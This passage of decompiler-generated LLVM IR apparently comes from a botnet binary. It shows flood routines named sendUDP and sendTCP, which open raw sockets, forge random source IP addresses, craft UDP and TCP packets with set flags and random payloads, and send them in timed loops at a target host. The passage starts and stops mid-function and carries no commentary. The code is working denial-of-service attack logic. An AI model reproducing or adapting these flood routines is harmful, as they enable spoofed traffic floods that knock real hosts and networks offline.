  store i32 268455128, i32* @lr, align 4
  %v2_10004cd4 = call i32 @__libc_write(i32 %v4_10004c9c, i32 %v2_10004c50)
  store i32 268455148, i32* @lr, align 4
  %v1_10004ce8 = call i32 @__libc_read(i32 %v4_10004c9c)
  store i32 ptrtoint ([3 x i8]* @global_var_10004cf4.194 to i32), i32* @lr, align 4
  %v1_10004cf0 = call i32 @__libc_close(i32 %v4_10004c9c)
  br label %dec_label_pc_10004cf4.backedge

dec_label_pc_10004cf4.backedge:                   ; preds = %dec_label_pc_10004cb4, %dec_label_pc_10004c8c
  store i32 268455164, i32* @lr, align 4
  %v1_10004cf8 = call i32 @__GI_time(i32 0)
  %v2_10004d04 = icmp slt i32 %v1_10004cf8, %v2_10004be8
  br i1 %v2_10004d04, label %dec_label_pc_10004c8c, label %dec_label_pc_10004d0c

dec_label_pc_10004d0c:                            ; preds = %dec_label_pc_10004cf4.backedge, %dec_label_pc_10004cf4.preheader
  %v0_10004d10 = call i32 @__GI_exit()
  br label %dec_label_pc_10004d14

dec_label_pc_10004d14:                            ; preds = %dec_label_pc_10004c04, %dec_label_pc_10004d0c
  %v0_10004d4413 = phi i32 [ 0, %dec_label_pc_10004c04 ], [ %v0_10004d10, %dec_label_pc_10004d0c ]
  %v1_10004d18 = add nuw nsw i32 %storemerge311, 1
  %v2_10004d28 = icmp slt i32 %v1_10004d18, %arg6
  br i1 %v2_10004d28, label %dec_label_pc_10004c04, label %dec_label_pc_10004d30

dec_label_pc_10004d30:                            ; preds = %dec_label_pc_10004d14, %entry
  %v0_10004d44 = phi i32 [ %v1_10004bdc, %entry ], [ %v0_10004d4413, %dec_label_pc_10004d14 ]
  ret i32 %v0_10004d44

; uselistorder directives
  uselistorder i32 %v2_10004c50, { 1, 2, 0, 3 }
  uselistorder i32 %v2_10004be8, { 1, 2, 0 }
  uselistorder i32 %v1_10004bdc, { 1, 0 }
  uselistorder i32 268455164, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_10004d14, { 1, 0 }
  uselistorder label %dec_label_pc_10004c8c, { 1, 0 }
  uselistorder label %dec_label_pc_10004c04, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10004d48 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10004d48, i32* %stack_var_-160, align 4
  %v0_10004d7c = load i32, i32* @r10, align 4
  store i32 2, i32* %stack_var_-112, align 4
  %v3_10004d8c = icmp eq i32 %arg2, 0
  br i1 %v3_10004d8c, label %dec_label_pc_10004d94, label %dec_label_pc_10004da8

dec_label_pc_10004d94:                            ; preds = %entry
  %v0_10004d94 = call i32 @rand_cmwc()
  br label %dec_label_pc_10004dc0

dec_label_pc_10004da8:                            ; preds = %entry
  %v1_10004dac = urem i32 %arg2, 65536
  store i32 %v1_10004dac, i32* @r3, align 4
  %v1_10004db4 = call i32 @htons(i32 %v1_10004dac)
  br label %dec_label_pc_10004dc0

dec_label_pc_10004dc0:                            ; preds = %dec_label_pc_10004d94, %dec_label_pc_10004da8
  %v2_10004dc0 = ptrtoint i32* %stack_var_-112 to i32
  %v4_10004dd0 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-108, i32 %v2_10004dc0)
  %v3_10004dd8 = icmp eq i32 %v4_10004dd0, 0
  br i1 %v3_10004dd8, label %dec_label_pc_10004de0, label %dec_label_pc_10005354

dec_label_pc_10004de0:                            ; preds = %dec_label_pc_10004dc0
  %v3_10004e04 = icmp eq i32 %arg4, 32
  br i1 %v3_10004e04, label %dec_label_pc_10004e0c, label %dec_label_pc_10004f68

dec_label_pc_10004e0c:                            ; preds = %dec_label_pc_10004de0
  store i32 268455452, i32* @lr, align 4
  %v3_10004e18 = call i32 @socket(i32 2, i32 2, i32 17)
  %v3_10004e28 = icmp eq i32 %v3_10004e18, 0
  br i1 %v3_10004e28, label %dec_label_pc_10005354, label %dec_label_pc_10004e30

dec_label_pc_10004e30:                            ; preds = %dec_label_pc_10004e0c
  %v1_10004e34 = add i32 %arg5, 1
  store i32 %v1_10004e34, i32* @r3, align 4
  store i32 268455488, i32* @lr, align 4
  %v0_10004e3c = call i32 @malloc()
  %v3_10004e4c = icmp eq i32 %v0_10004e3c, 0
  br i1 %v3_10004e4c, label %dec_label_pc_10005354, label %dec_label_pc_10004e54

dec_label_pc_10004e54:                            ; preds = %dec_label_pc_10004e30
  store i32 268455540, i32* @lr, align 4
  %v3_10004e70 = call i32 @__GI_memset(i32 %v0_10004e3c, i32 0, i32 %v1_10004e34)
  %v2_10004e7c = call i32 @makeRandomStr(i32 %v0_10004e3c, i32 %arg5)
  store i32 268455560, i32* @lr, align 4
  %v1_10004e84 = call i32 @__GI_time(i32 0)
  %v2_10004e90 = add i32 %v1_10004e84, %arg3
  %v1_10004f40 = mul i32 %v0_10004d7c, 1000
  br label %dec_label_pc_10004eac.outer

dec_label_pc_10004eac.outer:                      ; preds = %dec_label_pc_10004eac.outer.backedge, %dec_label_pc_10004e54
  %stack_var_-48.0.ph = phi i32 [ 0, %dec_label_pc_10004e54 ], [ %storemerge27, %dec_label_pc_10004eac.outer.backedge ]
  %stack_var_-44.0.ph = phi i32 [ 0, %dec_label_pc_10004e54 ], [ %v1_10004f24, %dec_label_pc_10004eac.outer.backedge ]
  br label %dec_label_pc_10004eac

dec_label_pc_10004eac:                            ; preds = %dec_label_pc_10004eac.outer, %dec_label_pc_10004f14
  %stack_var_-44.0 = phi i32 [ 0, %dec_label_pc_10004f14 ], [ %stack_var_-44.0.ph, %dec_label_pc_10004eac.outer ]
  store i32 268455632, i32* @lr, align 4
  %v7_10004ecc = call i32 @__libc_sendto(i32 %v3_10004e18, i32 %v0_10004e3c, i32 %arg5, i32 0, i32 %v2_10004dc0, i32 16, i32 %v2_10004dc0)
  %v4_10004ed8 = icmp eq i32 %stack_var_-44.0, %arg6
  br i1 %v4_10004ed8, label %dec_label_pc_10004ee0, label %dec_label_pc_10004f20

dec_label_pc_10004ee0:                            ; preds = %dec_label_pc_10004eac
  br i1 %v3_10004d8c, label %dec_label_pc_10004eec, label %dec_label_pc_10004efc

dec_label_pc_10004eec:                            ; preds = %dec_label_pc_10004ee0
  %v0_10004eec = call i32 @rand_cmwc()
  br label %dec_label_pc_10004efc

dec_label_pc_10004efc:                            ; preds = %dec_label_pc_10004ee0, %dec_label_pc_10004eec
  store i32 268455684, i32* @lr, align 4
  %v1_10004f00 = call i32 @__GI_time(i32 0)
  %v3_10004f0c = icmp sgt i32 %v1_10004f00, %v2_10004e90
  br i1 %v3_10004f0c, label %dec_label_pc_10005354, label %dec_label_pc_10004f14

dec_label_pc_10004f14:                            ; preds = %dec_label_pc_10004efc
  br label %dec_label_pc_10004eac

dec_label_pc_10004f20:                            ; preds = %dec_label_pc_10004eac
  %v1_10004f24 = add i32 %stack_var_-44.0, 1
  %v4_10004f34 = icmp eq i32 %stack_var_-48.0.ph, %arg7
  br i1 %v4_10004f34, label %dec_label_pc_10004f3c, label %dec_label_pc_10004f58

dec_label_pc_10004f3c:                            ; preds = %dec_label_pc_10004f20
  store i32 ptrtoint ([3 x i8]* @global_var_10004f4c.196 to i32), i32* @lr, align 4
  %v2_10004f48 = call i32 @usleep(i32 %v1_10004f40, i32 %arg7)
  br label %dec_label_pc_10004eac.outer.backedge

dec_label_pc_10004eac.outer.backedge:             ; preds = %dec_label_pc_10004f3c, %dec_label_pc_10004f58
  %storemerge27 = phi i32 [ %v1_10004f5c, %dec_label_pc_10004f58 ], [ 0, %dec_label_pc_10004f3c ]
  br label %dec_label_pc_10004eac.outer

dec_label_pc_10004f58:                            ; preds = %dec_label_pc_10004f20
  %v1_10004f5c = add i32 %stack_var_-48.0.ph, 1
  br label %dec_label_pc_10004eac.outer.backedge

dec_label_pc_10004f68:                            ; preds = %dec_label_pc_10004de0
  store i32 268455808, i32* @lr, align 4
  %v3_10004f7c = call i32 @socket(i32 2, i32 3, i32 17)
  %v3_10004f8c = icmp eq i32 %v3_10004f7c, 0
  br i1 %v3_10004f8c, label %dec_label_pc_10005344, label %dec_label_pc_10004f98

dec_label_pc_10004f98:                            ; preds = %dec_label_pc_10004f68
  store i32 1, i32* %stack_var_-96, align 4
  %v2_10004fa0 = ptrtoint i32* %stack_var_-96 to i32
  store i32 268455868, i32* @lr, align 4
  %v5_10004fb8 = call i32 @__GI_setsockopt(i32 %v3_10004f7c, i32 0, i32 3, i32 %v2_10004fa0, i32 4)
  %tmp77 = icmp sgt i32 %v5_10004fb8, -1
  br i1 %tmp77, label %dec_label_pc_10004fcc, label %dec_label_pc_10005344

dec_label_pc_10004fcc:                            ; preds = %dec_label_pc_10004f98
  br label %dec_label_pc_10004fd8

dec_label_pc_10004fd8:                            ; preds = %dec_label_pc_10004fcc, %dec_label_pc_10004fd8
  %v1_1000501022 = phi i32 [ 49, %dec_label_pc_10004fcc ], [ %v1_10005010, %dec_label_pc_10004fd8 ]
  store i32 268455904, i32* @lr, align 4
  %v1_10004fdc = call i32 @__GI_time(i32 0)
  %v0_10004fe8 = call i32 @rand_cmwc()
  %v2_10004ff0 = xor i32 %v1_10004fdc, %v0_10004fe8
  store i32 ptrtoint (i32* @global_var_10004ffc.197 to i32), i32* @lr, align 4
  %v1_10004ff8 = call i32 @srand(i32 %v2_10004ff0)
  store i32 268455936, i32* @lr, align 4
  %v0_10004ffc = call i32 @random()
  %v1_10005008 = call i32 @init_rand(i32 %v0_10004ffc)
  %v1_10005010 = add nsw i32 %v1_1000501022, -1
  %v4_10005020 = icmp eq i32 %v1_1000501022, 0
  br i1 %v4_10005020, label %dec_label_pc_10005028, label %dec_label_pc_10004fd8

dec_label_pc_10005028:                            ; preds = %dec_label_pc_10004fd8
  %v3_1000502c = icmp eq i32 %arg4, 0
  br i1 %v3_1000502c, label %dec_label_pc_10005058, label %dec_label_pc_10005040

dec_label_pc_10005040:                            ; preds = %dec_label_pc_10005028
  %v1_10005044 = sub i32 32, %arg4
  %v2_1000504c = urem i32 %v1_10005044, 64
  %v1_10005050 = shl i32 -1, %v2_1000504c
  br label %dec_label_pc_10005058

dec_label_pc_10005058:                            ; preds = %dec_label_pc_10005028, %dec_label_pc_10005040
  %storemerge10 = phi i32 [ %v1_10005050, %dec_label_pc_10005040 ], [ 0, %dec_label_pc_10005028 ]
  %v1_1000505c = add i32 %arg5, 28
  %v1_1000506c = add i32 %arg5, 58
  %v1_10005070 = and i32 %v1_1000506c, -16
  %v2_10005078 = load i32, i32* %stack_var_-160, align 4
  %v1_10005080 = load i32, i32* @r1, align 4
  %v3_10005080 = sub i32 %v1_10005080, %v1_10005070
  %v4_10005080 = inttoptr i32 %v3_10005080 to i32*
  store i32 %v2_10005078, i32* %v4_10005080, align 4
  %v1_10005090 = add i32 %v3_10005080, 23
  %v1_10005094 = and i32 %v1_10005090, -16
  %v1_100050b4 = add i32 %v1_10005094, 20
  %v5_100050b8 = inttoptr i32 %v1_100050b4 to i16*
  %v3_100050bc = load i32, i32* %stack_var_-108, align 4
  %v1_100050c4 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_100050c4, i32* @r3, align 4
  %v1_100050d0 = call i32 @htonl(i32 %v1_100050c4)
  %v1_100050dc = add i32 %arg5, 8
  %v6_100050f4 = inttoptr i32 %v1_10005094 to i32*
  %v7_100050f4 = call i32 @makeIPPacket(i32* %v6_100050f4, i32 %v3_100050bc, i32 %v1_100050d0, i32 17, i32 %v1_100050dc, i32 %arg5)
  %v1_10005104 = urem i32 %v1_100050dc, 65536
  store i32 %v1_10005104, i32* @r3, align 4
  %v1_1000510c = call i32 @htons(i32 %v1_10005104)
  %sext = mul i32 %v1_1000510c, 65536
  %v1_10005110 = sdiv i32 %sext, 65536
  %v1_10005118 = trunc i32 %v1_10005110 to i16
  %v3_10005118 = add i32 %v1_10005094, 24
  %v4_10005118 = inttoptr i32 %v3_10005118 to i16*
  store i16 %v1_10005118, i16* %v4_10005118, align 8
  %v0_1000511c = call i32 @rand_cmwc()
  %v1_1000512c = trunc i32 %v0_1000511c to i16
  store i16 %v1_1000512c, i16* %v5_100050b8, align 4
  br i1 %v3_10004d8c, label %dec_label_pc_1000513c, label %dec_label_pc_10005150

dec_label_pc_1000513c:                            ; preds = %dec_label_pc_10005058
  %v0_1000513c = call i32 @rand_cmwc()
  %extract.t87 = trunc i32 %v0_1000513c to i16
  br label %dec_label_pc_10005168

dec_label_pc_10005150:                            ; preds = %dec_label_pc_10005058
  %v1_10005154 = urem i32 %arg2, 65536
  store i32 %v1_10005154, i32* @r3, align 4
  %v1_1000515c = call i32 @htons(i32 %v1_10005154)
  %extract.t = trunc i32 %v1_1000515c to i16
  br label %dec_label_pc_10005168

dec_label_pc_10005168:                            ; preds = %dec_label_pc_1000513c, %dec_label_pc_10005150
  %storemerge78.off0 = phi i16 [ %extract.t, %dec_label_pc_10005150 ], [ %extract.t87, %dec_label_pc_1000513c ]
  %v1_10005248.pre-phi = phi i32 [ %v1_10005154, %dec_label_pc_10005150 ], [ 0, %dec_label_pc_1000513c ]
  %v3_10005170 = add i32 %v1_10005094, 22
  %v4_10005170 = inttoptr i32 %v3_10005170 to i16*
  store i16 %storemerge78.off0, i16* %v4_10005170, align 2
  %v3_1000517c = add i32 %v1_10005094, 26
  %v4_1000517c = inttoptr i32 %v3_1000517c to i16*
  store i16 0, i16* %v4_1000517c, align 2
  %v1_10005184 = add i32 %v1_10005094, 28
  %v2_10005190 = call i32 @makeRandomStr(i32 %v1_10005184, i32 %arg5)
  %v1_100051a0 = or i32 %v1_10005094, 2
  %v2_100051a0 = inttoptr i32 %v1_100051a0 to i16*
  %v3_100051a0 = load i16, i16* %v2_100051a0, align 2
  %v4_100051a0 = zext i16 %v3_100051a0 to i32
  %v5_100051b0 = inttoptr i32 %v1_10005094 to i16*
  %v6_100051b0 = call i32 @csum(i16* %v5_100051b0, i32 %v4_100051a0, i32 %v1_10005094, i32 17, i32 %v1_100050dc)
  %sext4 = mul i32 %v6_100051b0, 65536
  %v1_100051b4 = sdiv i32 %sext4, 65536
  %v1_100051bc = trunc i32 %v1_100051b4 to i16
  %v3_100051bc = or i32 %v1_10005094, 10
  %v4_100051bc = inttoptr i32 %v3_100051bc to i16*
  store i16 %v1_100051bc, i16* %v4_100051bc, align 2
  store i32 268456392, i32* @lr, align 4
  %v1_100051c4 = call i32 @__GI_time(i32 0)
  %v2_100051d0 = add i32 %v1_100051c4, %arg3
  %v3_10005278 = or i32 %v1_10005094, 4
  %v4_10005278 = inttoptr i32 %v3_10005278 to i16*
  %v2_10005298 = or i32 %v1_10005094, 12
  %v3_10005298 = inttoptr i32 %v2_10005298 to i32*
  %v1_1000531c = mul i32 %v0_10004d7c, 1000
  br label %dec_label_pc_100051ec.outer

dec_label_pc_100051ec.outer:                      ; preds = %dec_label_pc_100051ec.outer.backedge, %dec_label_pc_10005168
  %stack_var_-56.0.ph = phi i32 [ 0, %dec_label_pc_10005168 ], [ %storemerge26, %dec_label_pc_100051ec.outer.backedge ]
  %stack_var_-52.0.ph = phi i32 [ 0, %dec_label_pc_10005168 ], [ %v1_10005300, %dec_label_pc_100051ec.outer.backedge ]
  br label %dec_label_pc_100051ec

dec_label_pc_100051ec:                            ; preds = %dec_label_pc_100051ec.outer, %dec_label_pc_100052f0
  %stack_var_-52.0 = phi i32 [ 0, %dec_label_pc_100052f0 ], [ %stack_var_-52.0.ph, %dec_label_pc_100051ec.outer ]
  store i32 268456464, i32* @lr, align 4
  %v7_1000520c = call i32 @__libc_sendto(i32 %v3_10004f7c, i32 %v1_10005094, i32 %v1_1000505c, i32 0, i32 %v2_10004dc0, i32 16, i32 %v2_10004dc0)
  %v0_10005210 = call i32 @rand_cmwc()
  %v1_10005220 = trunc i32 %v0_10005210 to i16
  store i16 %v1_10005220, i16* %v5_100050b8, align 4
  br i1 %v3_10004d8c, label %dec_label_pc_10005230, label %dec_label_pc_10005244

dec_label_pc_10005230:                            ; preds = %dec_label_pc_100051ec
  %v0_10005230 = call i32 @rand_cmwc()
  %extract.t89 = trunc i32 %v0_10005230 to i16
  br label %dec_label_pc_1000525c

dec_label_pc_10005244:                            ; preds = %dec_label_pc_100051ec
  store i32 %v1_10005248.pre-phi, i32* @r3, align 4
  %v1_10005250 = call i32 @htons(i32 %v1_10005248.pre-phi)
  %extract.t88 = trunc i32 %v1_10005250 to i16
  br label %dec_label_pc_1000525c

dec_label_pc_1000525c:                            ; preds = %dec_label_pc_10005230, %dec_label_pc_10005244
  %storemerge80.off0 = phi i16 [ %extract.t88, %dec_label_pc_10005244 ], [ %extract.t89, %dec_label_pc_10005230 ]
  store i16 %storemerge80.off0, i16* %v4_10005170, align 2
  %v0_10005268 = call i32 @rand_cmwc()
  %v1_10005278 = trunc i32 %v0_10005268 to i16
  store i16 %v1_10005278, i16* %v4_10005278, align 4
  %v1_10005280 = call i32 @GetRandomIP(i32 %storemerge10)
  store i32 %v1_10005280, i32* @r3, align 4
  %v1_1000528c = call i32 @htonl(i32 %v1_10005280)
  store i32 %v1_1000528c, i32* %v3_10005298, align 4
  %v3_100052a8 = load i16, i16* %v2_100051a0, align 2
  %v4_100052a8 = zext i16 %v3_100052a8 to i32
  %v6_100052b8 = call i32 @csum(i16* %v5_100051b0, i32 %v4_100052a8, i32 %v1_10005094, i32 0, i32 %v2_10004dc0)
  %v1_100052c4 = trunc i32 %v6_100052b8 to i16
  store i16 %v1_100052c4, i16* %v4_100051bc, align 2
  %v4_100052d0 = icmp eq i32 %stack_var_-52.0, %arg6
  br i1 %v4_100052d0, label %dec_label_pc_100052d8, label %dec_label_pc_100052fc

dec_label_pc_100052d8:                            ; preds = %dec_label_pc_1000525c
  store i32 268456672, i32* @lr, align 4
  %v1_100052dc = call i32 @__GI_time(i32 0)
  %v3_100052e8 = icmp sgt i32 %v1_100052dc, %v2_100051d0
  br i1 %v3_100052e8, label %dec_label_pc_10005344, label %dec_label_pc_100052f0

dec_label_pc_100052f0:                            ; preds = %dec_label_pc_100052d8
  br label %dec_label_pc_100051ec

dec_label_pc_100052fc:                            ; preds = %dec_label_pc_1000525c
  %v1_10005300 = add i32 %stack_var_-52.0, 1
  %v4_10005310 = icmp eq i32 %stack_var_-56.0.ph, %arg7
  br i1 %v4_10005310, label %dec_label_pc_10005318, label %dec_label_pc_10005334

dec_label_pc_10005318:                            ; preds = %dec_label_pc_100052fc
  store i32 ptrtoint ([3 x i8]* @global_var_10005328.198 to i32), i32* @lr, align 4
  %v2_10005324 = call i32 @usleep(i32 %v1_1000531c, i32 %arg7)
  br label %dec_label_pc_100051ec.outer.backedge

dec_label_pc_100051ec.outer.backedge:             ; preds = %dec_label_pc_10005318, %dec_label_pc_10005334
  %storemerge26 = phi i32 [ %v1_10005338, %dec_label_pc_10005334 ], [ 0, %dec_label_pc_10005318 ]
  br label %dec_label_pc_100051ec.outer

dec_label_pc_10005334:                            ; preds = %dec_label_pc_100052fc
  %v1_10005338 = add i32 %stack_var_-56.0.ph, 1
  br label %dec_label_pc_100051ec.outer.backedge

dec_label_pc_10005344:                            ; preds = %dec_label_pc_100052d8, %dec_label_pc_10004f98, %dec_label_pc_10004f68
  %v0_1000536c31 = phi i32 [ %v5_10004fb8, %dec_label_pc_10004f98 ], [ 0, %dec_label_pc_10004f68 ], [ %v1_100052dc, %dec_label_pc_100052d8 ]
  br label %dec_label_pc_10005354

dec_label_pc_10005354:                            ; preds = %dec_label_pc_10004efc, %dec_label_pc_10004dc0, %dec_label_pc_10004e30, %dec_label_pc_10004e0c, %dec_label_pc_10005344
  %v0_1000536c = phi i32 [ %v4_10004dd0, %dec_label_pc_10004dc0 ], [ 0, %dec_label_pc_10004e30 ], [ 0, %dec_label_pc_10004e0c ], [ %v0_1000536c31, %dec_label_pc_10005344 ], [ %v1_10004f00, %dec_label_pc_10004efc ]
  ret i32 %v0_1000536c

; uselistorder directives
  uselistorder i32 %v1_10005248.pre-phi, { 1, 0 }
  uselistorder i32 %v1_10005154, { 2, 1, 0 }
  uselistorder i32 %v1_10005104, { 1, 0 }
  uselistorder i32 %v1_100050dc, { 2, 0, 1 }
  uselistorder i32 %v1_10005094, { 10, 3, 1, 2, 4, 11, 0, 5, 6, 7, 8, 9, 12, 13 }
  uselistorder i32 %v2_10004dc0, { 4, 5, 3, 2, 1, 0 }
  uselistorder i32 %v1_10004dac, { 1, 0 }
  uselistorder i32* %stack_var_-112, { 1, 0 }
  uselistorder i32* %stack_var_-108, { 1, 0 }
  uselistorder i32* %stack_var_-96, { 1, 0 }
  uselistorder i32 (i32, i32)* @usleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @makeRandomStr, { 1, 0 }
  uselistorder i32 %arg7, { 1, 3, 0, 2 }
  uselistorder i32 %arg5, { 1, 3, 2, 5, 4, 0, 6, 7 }
  uselistorder label %dec_label_pc_10005354, { 4, 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_100051ec.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_1000525c, { 1, 0 }
  uselistorder label %dec_label_pc_100051ec, { 1, 0 }
  uselistorder label %dec_label_pc_10005168, { 1, 0 }
  uselistorder label %dec_label_pc_10005058, { 1, 0 }
  uselistorder label %dec_label_pc_10004fd8, { 1, 0 }
  uselistorder label %dec_label_pc_10004eac.outer.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_10004efc, { 1, 0 }
  uselistorder label %dec_label_pc_10004eac, { 1, 0 }
  uselistorder label %dec_label_pc_10004dc0, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-76 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_10005370 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_10005370, i32* %stack_var_-128, align 4
  store i32 2, i32* %stack_var_-92, align 4
  %v3_100053c0 = icmp eq i32 %arg2, 0
  br i1 %v3_100053c0, label %dec_label_pc_100053c8, label %dec_label_pc_100053dc

dec_label_pc_100053c8:                            ; preds = %entry
  %v0_100053c8 = call i32 @rand_cmwc()
  br label %dec_label_pc_100053f4

dec_label_pc_100053dc:                            ; preds = %entry
  %v1_100053e0 = urem i32 %arg2, 65536
  store i32 %v1_100053e0, i32* @r3, align 4
  %v1_100053e8 = call i32 @htons(i32 %v1_100053e0)
  br label %dec_label_pc_100053f4

dec_label_pc_100053f4:                            ; preds = %dec_label_pc_100053c8, %dec_label_pc_100053dc
  %v2_100053f4 = ptrtoint i32* %stack_var_-92 to i32
  %v4_10005404 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-88, i32 %v2_100053f4)
  %v3_1000540c = icmp eq i32 %v4_10005404, 0
  br i1 %v3_1000540c, label %dec_label_pc_10005418, label %dec_label_pc_10005940

dec_label_pc_10005418:                            ; preds = %dec_label_pc_100053f4
  store i32 268457024, i32* @lr, align 4
  %v3_1000543c = call i32 @socket(i32 2, i32 3, i32 6)
  %v3_1000544c = icmp eq i32 %v3_1000543c, 0
  br i1 %v3_1000544c, label %dec_label_pc_10005940, label %dec_label_pc_10005458

dec_label_pc_10005458:                            ; preds = %dec_label_pc_10005418
  store i32 1, i32* %stack_var_-76, align 4
  %v2_10005460 = ptrtoint i32* %stack_var_-76 to i32
  store i32 268457084, i32* @lr, align 4
  %v5_10005478 = call i32 @__GI_setsockopt(i32 %v3_1000543c, i32 0, i32 3, i32 %v2_10005460, i32 4)
  %tmp59 = icmp sgt i32 %v5_10005478, -1
  br i1 %tmp59, label %dec_label_pc_1000548c, label %dec_label_pc_10005940

dec_label_pc_1000548c:                            ; preds = %dec_label_pc_10005458
  %v3_10005490 = icmp eq i32 %arg4, 0
  br i1 %v3_10005490, label %dec_label_pc_100054bc, label %dec_label_pc_100054a4

dec_label_pc_100054a4:                            ; preds = %dec_label_pc_1000548c
  %v1_100054a8 = sub i32 32, %arg4
  %v2_100054b0 = urem i32 %v1_100054a8, 64
  %v1_100054b4 = shl i32 -1, %v2_100054b0
  br label %dec_label_pc_100054bc

dec_label_pc_100054bc:                            ; preds = %dec_label_pc_1000548c, %dec_label_pc_100054a4
  %storemerge9 = phi i32 [ %v1_100054b4, %dec_label_pc_100054a4 ], [ 0, %dec_label_pc_1000548c ]
  %v1_100054c0 = add i32 %arg6, 40
  %v1_100054d0 = add i32 %arg6, 70
  %v1_100054d4 = and i32 %v1_100054d0, -16
  %v2_100054dc = load i32, i32* %stack_var_-128, align 4
  %v1_100054e4 = load i32, i32* @r1, align 4
  %v3_100054e4 = sub i32 %v1_100054e4, %v1_100054d4
  %v4_100054e4 = inttoptr i32 %v3_100054e4 to i32*
  store i32 %v2_100054dc, i32* %v4_100054e4, align 4
  %v1_100054f4 = add i32 %v3_100054e4, 23
  %v1_100054f8 = and i32 %v1_100054f4, -16
  %v1_10005518 = add i32 %v1_100054f8, 20
  %v5_1000551c = inttoptr i32 %v1_10005518 to i16*
  %v3_10005520 = load i32, i32* %stack_var_-88, align 4
  %v1_10005528 = call i32 @GetRandomIP(i32 %storemerge9)
  store i32 %v1_10005528, i32* @r3, align 4
  %v1_10005534 = call i32 @htonl(i32 %v1_10005528)
  %v1_10005540 = add i32 %arg6, 20
  %v6_10005558 = inttoptr i32 %v1_100054f8 to i32*
  %v7_10005558 = call i32 @makeIPPacket(i32* %v6_10005558, i32 %v3_10005520, i32 %v1_10005534, i32 6, i32 %v1_10005540, i32 %arg6)
  %v0_1000555c = call i32 @rand_cmwc()
  %v1_1000556c = trunc i32 %v0_1000555c to i16
  store i16 %v1_1000556c, i16* %v5_1000551c, align 4
  %v0_10005570 = call i32 @rand_cmwc()
  %v2_1000557c = add i32 %v1_100054f8, 24
  %v3_1000557c = inttoptr i32 %v2_1000557c to i32*
  store i32 %v0_10005570, i32* %v3_1000557c, align 8
  %v2_10005588 = add i32 %v1_100054f8, 28
  %v3_10005588 = inttoptr i32 %v2_10005588 to i32*
  store i32 0, i32* %v3_10005588, align 4
  %v1_10005590 = add i32 %v1_100054f8, 32
  %v2_10005590 = inttoptr i32 %v1_10005590 to i32*
  %v1_10005598 = call i32 @__asm_rlwimi(i32 5, i32 28, i32 0, i32 3)
  %v2_1000559c = add i32 %v1_100054f8, 32
  %v3_1000559c = inttoptr i32 %v2_1000559c to i32*
  store i32 %v1_10005598, i32* %v3_1000559c, align 16
  store i32 ptrtoint ([4 x i8]* @global_var_10011380.199 to i32), i32* @r4, align 4
  %v3_100055b0 = inttoptr i32 %arg5 to i8*
  %v4_100055b0 = call i32 @__GI_strcoll(i8* %v3_100055b0, i32 ptrtoint ([4 x i8]* @global_var_10011380.199 to i32))
  %v3_100055b8 = icmp eq i32 %v4_100055b0, 0
  br i1 %v3_100055b8, label %dec_label_pc_100055c0, label %dec_label_pc_10005614

dec_label_pc_100055c0:                            ; preds = %dec_label_pc_100054bc
  %v3_100055c4 = load i32, i32* %v2_10005590, align 16
  %v1_10005608 = or i32 %v3_100055c4, 2031616
  store i32 %v1_10005608, i32* %v2_10005590, align 16
  br label %dec_label_pc_10005758

dec_label_pc_10005614:                            ; preds = %dec_label_pc_100054bc
  store i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32* @r4, align 4
  store i32 268457512, i32* @lr, align 4
  %v4_10005624 = call i32 @__GI_strtok(i32 %arg5, i32 ptrtoint (i32* @global_var_10011384.200 to i32), i32 ptrtoint ([31 x i8]* @global_var_10010000.5 to i32))
  %v3_1000575018 = icmp eq i32 %v4_10005624, 0
  br i1 %v3_1000575018, label %dec_label_pc_10005758, label %dec_label_pc_10005634

dec_label_pc_10005634:                            ; preds = %dec_label_pc_10005614, %dec_label_pc_10005734
  %storemerge1319 = phi i32 [ %v4_10005740, %dec_label_pc_10005734 ], [ %v4_10005624, %dec_label_pc_10005614 ]
  store i32 ptrtoint ([4 x i8]* @global_var_10011388.201 to i32), i32* @r4, align 4
  %v3_10005644 = inttoptr i32 %storemerge1319 to i8*
  %v4_10005644 = call i32 @__GI_strcoll(i8* %v3_10005644, i32 ptrtoint ([4 x i8]* @global_var_10011388.201 to i32))
  %v3_1000564c = icmp eq i32 %v4_10005644, 0
  br i1 %v3_1000564c, label %dec_label_pc_10005654, label %dec_label_pc_10005668

dec_label_pc_10005654:                            ; preds = %dec_label_pc_10005634
  %v3_10005658 = load i32, i32* %v2_10005590, align 16
  %v1_1000565c = or i32 %v3_10005658, 131072
  store i32 %v1_1000565c, i32* %v2_10005590, align 16
  br label %dec_label_pc_10005734

dec_label_pc_10005668:                            ; preds = %dec_label_pc_10005634
  store i32 ptrtoint ([4 x i8]* @global_var_1001138c.202 to i32), i32* @r4, align 4
  %v4_10005678 = call i32 @__GI_strcoll(i8* %v3_10005644, i32 ptrtoint ([4 x i8]* @global_var_1001138c.202 to i32))
  %v3_10005680 = icmp eq i32 %v4_10005678, 0
  br i1 %v3_10005680, label %dec_label_pc_10005688, label %dec_label_pc_1000569c

dec_label_pc_10005688:                            ; preds = %dec_label_pc_10005668
  %v3_1000568c = load i32, i32* %v2_10005590, align 16
  %v1_10005690 = or i32 %v3_1000568c, 262144
  store i32 %v1_10005690, i32* %v2_10005590, align 16
  br label %dec_label_pc_10005734

dec_label_pc_1000569c:                            ; preds = %dec_label_pc_10005668
